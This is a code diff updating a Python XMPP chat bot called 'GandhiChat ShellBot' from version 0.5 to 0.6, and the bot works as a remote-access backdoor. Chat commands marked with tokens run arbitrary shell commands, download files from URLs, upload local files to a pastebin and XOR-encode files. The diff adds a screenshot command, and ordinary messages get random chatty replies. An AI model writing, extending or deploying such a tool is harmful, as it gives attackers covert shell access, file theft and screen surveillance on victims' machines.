@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 
-# GandhiChat ShellBot v0.5
+# GandhiChat ShellBot v0.6
 # Code borrowed from SleekXMPP's MUCBot and Sentynel's Pastebin script
 # https://github.com/fritzy/SleekXMPP/blob/develop/examples/muc.py
 # https://sentynel.com/project/Pastebin_Script
@@ -13,6 +13,7 @@ import getpass
 import urllib2, urllib
 from optparse import OptionParser
 import sleekxmpp
+import pyscreenshot as ImageGrab
 
 # Requires a Google account user name that allows less secure apps.
 # https://www.google.com/settings/security/lesssecureapps
@@ -22,6 +23,7 @@ CMD_TOKEN = '$'
 DWNLD_TOKEN = '!'
 UPLD_TOKEN = '^'
 XOR_TOKEN = '%'
+SCRN_TOKEN = '*'
 
 SERVICE_DISCOVERY = 'xep_0030'
 MULTIUSER_CHAT = 'xep_0045'
@@ -76,30 +78,36 @@ class MUCBot(sleekxmpp.ClientXMPP):
   def message(self, msg):
     if msg['type'] in ('chat', 'normal'):
       body = msg['body']
-      #Execute and respond to $command instructions
+      # Execute and respond to $command instructions
       if body and body[0] == CMD_TOKEN:
         reply = self.run_command(body.lstrip(CMD_TOKEN))
         msg.reply(reply).send()
         return
-      #Execute and respond to !download instructions
+      # Execute and respond to !download instructions
       if body and body[0] == DWNLD_TOKEN:
         self.download(body.lstrip(DWNLD_TOKEN))
         savedToMsg = "file saved to: {}".format(
           body.lstrip(DWNLD_TOKEN).split('/')[-1])
         msg.reply(savedToMsg).send()
         return
-      #Execute and respond to the ^upload instruction
+      # Execute and respond to the ^upload instruction
       if body and body[0] == UPLD_TOKEN:
         reply = self.upload(body.lstrip(UPLD_TOKEN))
         msg.reply("file posted to: "+reply).send()
         return
-      #Execute and respond to the %xor instruction  
+      # Execute and respond to the %xor instruction  
       if body and body[0] == XOR_TOKEN:
         file_name = format(body.lstrip(XOR_TOKEN).split('/')[-1])
         self.xor(file_name, file_name+".new", self.xor_var)
         msg.reply("file saved as "+file_name+".new").send()
         return
-      #Default response if no special tokens were given
+      # Execute and respond to the *screenshot instruction  
+      if body and body[0] == SCRN_TOKEN:
+        file_name = format(body.lstrip(SCRN_TOKEN))
+        ImageGrab.grab_to_file(file_name+".png")
+        msg.reply("screenshot saved as "+file_name+".png").send()
+        return
+      # Default response if no special tokens were given
       time.sleep(random.uniform(0.4, 2.45))
       reply = random.choice(MESSAGES)
       msg.reply(reply).send()
@@ -111,7 +119,7 @@ class MUCBot(sleekxmpp.ClientXMPP):
                         mbody="I heard that, %s." % msg['mucnick'],
                         mtype='groupchat')
 
-  #Announce when bot comes online
+  # Announce when bot comes online
   def muc_online(self, presence):
     if presence['muc']['nick'] != self.nick:
       self.send_message(mto=presence['from'].bare,
@@ -119,14 +127,14 @@ class MUCBot(sleekxmpp.ClientXMPP):
                                                 presence['muc']['nick']),
                         mtype='groupchat')
 
-  #Essential shell functionality
+  # Essential shell functionality
   def run_command(self, cmd):
     proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
       stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     stdoutput = proc.stdout.read() + proc.stderr.read()
     return stdoutput
 
-  #Grab our file from some url and save it to a file
+  # Grab our file from some url and save it to a file
   def download(self, url):
     req = urllib2.Request('%s' % (url))
     message = urllib2.urlopen(req)
@@ -135,7 +143,7 @@ class MUCBot(sleekxmpp.ClientXMPP):
     localFile.write(message.read())
     localFile.close()
 
-  #Make paste request
+  # Make paste request
   def upload(self, filename):
     localFile = open(filename, 'r')
     fi = localFile.read()
@@ -156,6 +164,7 @@ class MUCBot(sleekxmpp.ClientXMPP):
       else:
         return reply
 
+  # XOR file w/ bytes
   def xor(self, orginal_file, new_file, xor_var):
     l = len(xor_var)
     data = bytearray(open(orginal_file, 'rb').read())
@@ -166,12 +175,13 @@ class MUCBot(sleekxmpp.ClientXMPP):
     localFile.write(result)
     localFile.close()
 
+  # Helper function for XOR
   def hexToByte(self, hexStr):
     bytes = []
     hexStr = ''.join( hexStr.split(" ") )
     for i in range(0, len(hexStr), 2):
       bytes.append( chr( int (hexStr[i:i+2], 16 ) ) )
-    return bytes
+    return bytes    
 
 
 def main():
